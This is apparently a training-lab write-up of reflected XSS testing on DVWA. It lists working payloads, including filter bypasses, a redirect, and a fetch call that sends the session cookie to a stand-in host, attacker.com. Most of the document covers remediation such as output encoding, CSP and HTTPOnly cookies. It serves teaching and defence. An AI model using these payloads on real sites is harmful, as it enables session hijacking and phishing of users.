# Reflected XSS Vulnerability Analysis

## 📋 Overview
Reflected XSS occurs when user-supplied data is immediately returned by a web application without proper sanitization, allowing attackers to inject malicious JavaScript that executes in the victim's browser.

**Vulnerability Type:** CWE-79  
**OWASP Category:** A03:2021 - Injection  
**Severity:** HIGH (CVSS 7.1)

## 🔍 Discovery Process

### Initial Testing

**Input:** `Daniel`  
**Response:** `Hello Daniel`  
**Conclusion:** User input is reflected directly in the response

**Input:** `<script>alert('XSS')</script>`  
**Response:** JavaScript alert box executed  
**Conclusion:** No sanitization - fully vulnerable to XSS

## 🎯 Successful Exploitation Payloads

### 1. Basic Script Tag Injection
html
<script>alert('XSS')</script>

**Result:** ✅ Alert box displayed  
**Impact:** Arbitrary JavaScript execution

### 2. Cookie Theft
html
<script>alert(document.cookie)</script>

**Result:** ✅ Session cookie displayed  
**Impact:** Session hijacking possible  
**Cookie Retrieved:** `PHPSESSID=xxx; security=low`

### 3. Image Tag with Event Handler
html
<img src=x onerror=alert('XSS')>

**Result:** ✅ Alert triggered via onerror event  
**Impact:** Bypasses basic script tag filters

### 4. SVG Tag Injection
html
<svg/onload=alert('XSS')>

**Result:** ✅ Alert triggered on SVG load  
**Impact:** Alternative injection vector

### 5. Iframe JavaScript URI
html
<iframe src="javascript:alert('XSS')">

**Result:** ✅ JavaScript executed in iframe context  
**Impact:** Additional bypass technique

### 6. Page Redirection
html
<script>window.location='https://malicious-site.com'</script>

**Result:** ✅ Page redirected to specified URL  
**Impact:** Phishing, malware distribution

## 📸 Evidence
- `xss-reflected-01-alert.png` - Basic XSS alert
- `xss-reflected-02-cookie-theft.png` - Session cookie theft
- `xss-reflected-03-img-tag.png` - Image tag bypass

## 🛡️ Impact Assessment

**Severity: HIGH**

### Potential Consequences
1. **Session Hijacking** - Steal authentication cookies
2. **Credential Theft** - Capture keystrokes, form data
3. **Phishing** - Display fake login forms
4. **Malware Distribution** - Redirect to exploit kits
5. **Website Defacement** - Modify page content
6. **Information Disclosure** - Access sensitive data via JavaScript

### Attack Scenario
javascript
// Attacker sends victim this link:
http://vulnerable-site.com/page?name=<script>
fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>

// When victim clicks, their session cookie is sent to attacker
// Attacker can now impersonate the victim


## 🔒 Remediation Strategies

### 1. Output Encoding (PRIMARY DEFENSE)

**Vulnerable Code:**
php
<?php
$name = $_GET['name'];
echo "Hello " . $name;  // DANGEROUS!
?>


**Secure Code:**
php
<?php
$name = $_GET['name'];
// HTML entity encoding
echo "Hello " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
?>


**What This Does:**
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`
- `'` becomes `&#039;`

**Result:** Browser displays the text, doesn't execute it as code

### 2. Content Security Policy (CSP)

**HTTP Header:**

Content-Security-Policy: default-src 'self'; script-src 'self'


**What This Does:**
- Blocks inline JavaScript (`<script>` tags in HTML)
- Only allows scripts from same origin
- Prevents XSS even if output encoding fails

**Implementation (Apache):**
apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'"


**Implementation (Nginx):**
nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'";


### 3. Input Validation

**Whitelist Validation:**
php
<?php
$name = $_GET['name'];

// Only allow alphanumeric characters and spaces
if (!preg_match('/^[a-zA-Z0-9 ]+$/', $name)) {
    die("Invalid input - only letters, numbers, and spaces allowed");
}

echo "Hello " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
?>


### 4. HTTPOnly Cookie Flag

**Secure Cookie Configuration:**
php
<?php
// Set HTTPOnly flag on session cookie
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => '',
    'secure' => true,      // HTTPS only
    'httponly' => true,    // Not accessible via JavaScript
    'samesite' => 'Strict' // CSRF protection
]);
session_start();
?>


**Impact:** Even if XSS exists, `document.cookie` won't reveal session cookie

### 5. X-XSS-Protection Header

**HTTP Header:**

X-XSS-Protection: 1; mode=block


**Note:** Deprecated in modern browsers but still useful for older browsers

### 6. Template Engines with Auto-Escaping

**Using Modern Frameworks:**
python
# Flask with Jinja2 (auto-escapes by default)
from flask import Flask, render_template_string

app = Flask(_name_)

@app.route('/hello/<name>')
def hello(name):
    # Jinja2 automatically escapes HTML
    return render_template_string("<h1>Hello {{ name }}</h1>", name=name)


## 🧪 Testing on Higher Security Levels

### Medium Security

**Code Changes:**
php
<?php
$name = str_replace('<script>', '', $_GET['name']);
echo "Hello " . $name;
?>


**Bypass Technique:**
html
<scr<script>ipt>alert('XSS')</script>

**Why It Works:** Filter only removes one `<script>`, leaving the nested one

**Alternative Bypass:**
html
<img src=x onerror=alert('XSS')>

**Why It Works:** Doesn't use `<script>` tag at all

### High Security

**Code Changes:**
php
<?php
$name = preg_replace('/<(.)s(.)c(.)r(.)i(.)p(.)t/i', '', $_GET['name']);
echo "Hello " . htmlspecialchars($name);
?>


**Result:** Much harder to exploit - partial sanitization implemented

### Impossible Security

**Code Changes:**
php
<?php
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "Hello " . $name;
?>


**Result:** ✅ UNBREAKABLE - Proper output encoding

## 🎯 Key Takeaways

1. ✅ **Always encode output** - Use `htmlspecialchars()`, framework auto-escaping
2. ✅ **Validate input** - Whitelist allowed characters
3. ✅ **Use CSP** - Defense in depth
4. ✅ **HTTPOnly cookies** - Protect session tokens
5. ✅ **Never trust user input** - Treat all input as malicious
6. ✅ **Use modern frameworks** - They handle escaping automatically
7. ✅ **Test thoroughly** - Try multiple injection vectors

## 📚 Learning Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

**Tested By:** Daniel Oyanogbezina  
**Date:** December 14, 2025  
**DVWA Security Level:** Low  
**Status:** ✅ Successfully Exploited | 🛡️ Remediation Documented
